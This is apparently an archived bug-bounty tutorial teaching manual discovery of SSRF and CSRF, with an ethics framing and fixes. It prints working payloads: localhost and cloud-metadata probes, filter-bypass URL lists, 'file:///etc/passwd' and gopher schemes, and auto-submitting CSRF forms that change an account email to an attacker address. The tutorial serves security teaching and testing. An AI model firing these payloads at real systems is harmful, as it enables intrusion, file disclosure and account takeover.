# The Requests You Didn’t Send

- **Source URL:** https://medium.com/@vigneshkumaroffsec/the-requests-you-didnt-send-finding-ssrf-and-csrf-by-hand-c2f208f114ab
- **Fetched from:** https://web.archive.org/web/20261117151749/https://medium.com/@vigneshkumaroffsec/the-requests-you-didnt-send-finding-ssrf-and-csrf-by-hand-c2f208f114ab
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14982 (id 14982)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# The Requests You Didn’t Send: Finding SSRF and CSRF by Hand

*Two bugs that live in the same blind spot — one makes the server send a request it shouldn’t, the other makes the browser forge one. Here’s the manual process I use to find and confirm both, with the payloads that actually work. Authorized testing only.*

By Vignesh Kumar | Security Researcher

SSRF and CSRF get grouped together in training material and then forgotten in real testing, because scanners under-report both. They sit in the same blind spot for the opposite reason. A scanner misses **SSRF** because the proof lives on an *external* channel it isn’t watching — a DNS lookup, an HTTP callback — not in the response. It misses **CSRF** because confirming it needs a second browser context and a judgment call about what a missing token actually means, and a tool can’t make that call.

Both are about a request that the *wrong party* caused. In SSRF you make the **server** send a request it was never meant to send. In CSRF you make a victim’s **browser** send a request they never meant to send. Same shape, different direction. This is the manual method I use for each, on targets I’m **authorized** to test — a program in scope, a client engagement, or a lab I own. Everything here runs on **test accounts and test data**, and the goal is always to *prove* the flaw with the lightest touch and report it, never to pivot into infrastructure or act on a real user.

## Part 1 — SSRF: making the server fetch

## Step 1: Find the inputs that become a request

SSRF lives wherever the server takes something you control and *fetches a URL* with it. So before any payload, I inventory every feature that could make an outbound request:

- **Obvious URL inputs** — webhook configuration, “import from URL”, avatar-by-URL, link preview, PDF/screenshot generators that render a page you give them.
- **Hidden fetchers** — an SSO/OIDC `redirect_uri` or JWKS URL, an XML parser (XXE often becomes SSRF), an RSS/feed reader, a file importer that accepts `http://` as well as a file.
- **Parameters that don’t look like URLs** — a `host`, `domain`, `callback`, `dest`, `region`, or `path` field that gets concatenated into a request server-side.

For each one, the question is simple: *does the server reach out based on what I typed?* That’s what I test next.

## Step 2: Probe with a channel you control

The cardinal rule of SSRF: **don’t trust the response to tell you it worked — watch an external channel.** I point the input at a collaborator URL (Burp Collaborator, `interactsh`, or any webhook listener I own) and watch for a hit:

`url=https://<my-collaborator-id>.oast.fun/`
If I get a DNS lookup *and* an HTTP request on my listener, the server fetched it — that’s SSRF confirmed, even if the application response shows nothing. A DNS hit with no HTTP request still matters: it means the server resolved my host before some filter blocked the fetch, which tells me a filter exists and where it sits.

This single step is what scanners skip. The proof was never in the page.

## Step 3: Turn “it fetched” into “it reached internal”

An external callback proves the server makes requests. The *impact* is reaching things only the server can reach — loopback, the internal network, and cloud metadata. I start with the lightest internal probe and read the response (or the timing) differentially:

```
url=http://127.0.0.1/
url=http://localhost/
url=http://169.254.169.254/        # cloud metadata endpoint — stop and look, don't harvest
```
If `127.0.0.1` behaves differently from a dead external host (different status, different length, a connection that succeeds where an external one is blocked), the server is talking to itself. I confirm internal reachability with a timing test, exactly like blind SQLi — a port that's open responds fast, a filtered one hangs — and I keep the probe to *proving reachability*, not scanning the whole subnet.

## Step 4: Bypass the filter (the payloads that matter)

Most targets have *some* block on `localhost` and `169.254.169.254`. The filter is usually a naive string match or a single parse, and that's what these payloads defeat. I work down the list:

**Alternate representations of 127.0.0.1:**

```
http://0.0.0.0/
http://0/
http://127.1/
http://2130706433/          # decimal
http://0x7f000001/          # hex
http://[::1]/               # IPv6 loopback
http://127.0.0.1.nip.io/    # resolves to 127.0.0.1 via a public DNS
```
**Parser confusion — the @ and the fake host:**

```
http://expected-host.com@127.0.0.1/
http://127.0.0.1#@expected-host.com/
http://expected-host.com:80@169.254.169.254/
```
The app’s validator reads `expected-host.com` as the host; the HTTP client reads everything after `@` as the real target. A mismatch between *what validates the URL* and *what fetches it* is the whole bug class.

**Redirect-based bypass** — when the validator only checks the first URL:

`url=https://my-server.com/redirect   ->   302 Location: http://169.254.169.254/...`
I host a redirector that returns a 302 to the internal target. The validator sees my allowed domain; the fetcher follows the redirect inside.

**DNS rebinding** — when the validator resolves the host, approves the IP, then the fetcher resolves *again* and gets a different one. I serve a hostname that flips between a public IP and `127.0.0.1` on short TTL.

**Non-HTTP schemes**, where the client allows them:

```
file:///etc/passwd
gopher://127.0.0.1:6379/_...     # can speak to Redis/SMTP etc. — powerful, test with great care
dict://127.0.0.1:11211/
```
Each payload targets the same root cause: **the thing that validates the URL and the thing that fetches it disagree.** Find that gap and the filter falls.

## Step 5: Prove impact with the lightest touch

The clean proof of SSRF is a single value that *only* an internal fetch could return — a loopback-only page’s title, an internal service banner, a short response that a public host could never produce. If a cloud metadata endpoint is reachable, the *reachability itself* is the finding — I note that the endpoint responds and **stop**. I do not pull credentials, I do not call cloud APIs with anything I see, and I do not enumerate the internal network. Prove the server fetched where it shouldn’t; don’t ride the request anywhere.

## Part 2 — CSRF: making the browser forge

CSRF is the mirror image. There’s no server-side fetch to trigger — instead, a state-changing request succeeds using the victim’s session *just because their browser attached the cookie automatically*. The whole bug is: can an attacker’s page cause that request without the user meaning to?

## Step 1: Find the state-changing requests

CSRF only matters where a request *changes something* — change email, change password, transfer, delete, add a member, toggle a setting. I list every such action and capture the exact request for each. Read-only endpoints aren’t CSRF targets (though a GET that changes state is a classic finding on its own).

## Step 2: The differential that confirms it

A missing token field doesn’t prove CSRF — the server might validate something else (Origin, a custom header, re-auth). I confirm with **controlled tampering**, one variable at a time, from a valid captured request:

- **Drop the token entirely.** Still succeeds → not enforced.
- **Keep the parameter, blank the value.** Succeeds → presence checked, value not.
- **Reuse another user’s valid token.** Succeeds → token not bound to the session (a very common real finding).
- **Change the method** (POST → GET). Succeeds → method-agnostic, GET-CSRF is on the table.
- **Strip the** **Origin**
**/****Referer**
 **header.** Succeeds → no origin validation, so a cross-site page works.

If a request still goes through with its anti-CSRF defense removed or swapped, it’s vulnerable. That differential — *remove the defense, watch it still work* — is the confirmation discipline, the same way `1=1 vs 1=2` confirms SQLi.

## Step 3: The payloads, by content type

The proof-of-concept *is* the payload: a page that, when the logged-in victim opens it, fires the request cross-site. Which one depends on how the endpoint takes its input.

## Get Vigneshkumaroffsec’s stories in your inbox

Join Medium for free to get updates from this writer.

**GET — one tag, no interaction:**

`<img src="https://target.com/account/delete?id=42">`
**Form POST (urlencoded) — auto-submitting:**

```
<form action="https://target.com/account/email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```
**JSON endpoint via** **text/plain**`Content-Type`, a form can send a body that parses as JSON while staying a "simple" cross-site request:

```
<form action="https://target.com/api/profile" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```
If the endpoint *strictly* requires `application/json`, a cross-site `fetch` can't send that without a preflight the attacker can't satisfy — and that strictness is itself the defense. Noting *why* the PoC fails is as valuable as a PoC that works.

**Multipart** — for endpoints expecting file-style forms, `enctype="multipart/form-data"` with the fields as inputs.

## Step 4: SameSite is part of the verdict now

Modern browsers default cookies to `SameSite=Lax`, which blocks cookies on most cross-site POSTs — so a classic CSRF PoC may *fail even when the server has no token*, because the browser protected the user. I state this honestly in a report: whether the cookie is `SameSite=None` (fully exploitable cross-site), `Lax` (GET top-level navigations still carry it — a state-changing GET is still live), or `Strict`. The finding's severity depends on it, and claiming exploitability the browser actually blocks is the fastest way to lose a triager's trust.

## Step 5: Prove impact minimally

The proof is the self-submitting PoC changing **my own test account’s** state from a different origin — my email field flips, my setting toggles. One benign, reversible change on an account I own demonstrates the forged request worked. I don’t target another user, and I don’t chain it into account takeover against anyone real.

## The fixes (finding it is half the job)

**SSRF** is fixed on the server, not with a blocklist:

- Resolve the host, then **validate the resolved IP against an allow-list** before fetching, and re-check after redirects — defeat the parse-vs-fetch gap directly.
- **Disable unneeded schemes and redirects** in the HTTP client; allow only `http`/`https` to approved hosts.
- Block link-local and private ranges (`127.0.0.0/8`, `169.254.0.0/16`, RFC1918) at the network layer, and put the metadata endpoint behind IMDSv2 / a required header.
- Don’t reflect the fetched response back to the user.

**CSRF** is fixed by not relying on the cookie alone:

- **Anti-CSRF token** that is per-session, unpredictable, and *validated as bound to that session* — not merely present.
- **SameSite=Lax**
 **or** **Strict**
- **Validate** **Origin**
**/****Referer**
- Re-authenticate for the highest-value actions (password, email, payment).

## Common Mistakes to Avoid

- Judging SSRF by the HTTP response instead of an external channel — the proof is the DNS/HTTP callback you control.
- Testing only inputs that look like URLs, and skipping webhooks, PDF/screenshot generators, OIDC fields, and XML parsers.
- Giving up at the first `localhost` block — the bypass payloads exist exactly for naive filters.
- Riding an SSRF into cloud metadata and harvesting credentials. Reachability is the finding; stop there.
- Calling a missing token “CSRF” without the differential — the server may enforce Origin or a custom header instead.
- Forgetting `SameSite`: a PoC the browser blocks isn't an exploit, and claiming it costs you credibility.
- Testing CSRF on read-only endpoints — no state change, no finding.
- Reporting either bug without the server-side fix, so one endpoint gets patched and the pattern survives.

## A Quick Tester’s Checklist

- **SSRF:** every outbound-request feature mapped; probed with a collaborator URL; internal reach confirmed differentially; filter bypassed via alt-IP / `@` / redirect / rebinding only as needed; impact proven with one internal-only value, metadata left untouched.
- **CSRF:** every state-changing request captured; confirmed by removing/swapping the defense and watching it still work; PoC matched to the content type; `SameSite` and Origin checks accounted for in the verdict; proven on your own test account with one reversible change.
- Everything inside an authorized scope, on test accounts, reported through the official channel with the fix.

## Final Thoughts

SSRF and CSRF survive for the same reason SQLi does: the loud cases get fixed and the contextual ones get missed, and the contextual ones are where a human who understands the request flow beats a tool that doesn’t. The method is the same discipline both times — find the request you can influence, confirm it with a differential or an out-of-band signal instead of a guess, bypass the naive filter, and prove impact with the lightest possible touch. Then report it with the server-side fix and stop.

If you’re starting out, build the reflex in a lab you’re allowed to break — PortSwigger’s Web Security Academy has dedicated SSRF and CSRF tracks that let you run every payload above against no one but yourself. Get the out-of-band confirmation and the differential right there, and you’ll find the real ones without ever fooling yourself or crossing a line.

## About me

I’m Vignesh Kumar, a security researcher working across application security, DevSecOps, cloud security, and vulnerability research.

I share practical findings from security assessments and responsible disclosures to help improve the security of real-world systems.

*The techniques in this article are described for defending and testing systems you own or are authorized to assess.*
